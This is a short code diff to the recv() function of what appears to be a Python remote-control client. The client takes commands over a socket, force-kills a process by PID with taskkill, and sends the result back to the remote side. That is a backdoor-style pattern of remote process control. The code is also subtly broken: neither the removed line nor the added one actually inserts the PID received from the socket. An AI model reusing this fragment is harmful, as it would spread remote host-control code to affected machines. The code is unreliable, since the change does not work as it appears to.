@@ -1469,7 +1469,7 @@ def recv():
                 pass
 
             elif command == "<KILLED>":
-                out = subprocess.check_output(f"taskkill /F /PID client.recv(1024).decode()")
+                out = subprocess.check_output(f"taskkill /F /PID {r"{client.recv(1024).decode()}"}")
                 client.send(out)
 
             else:
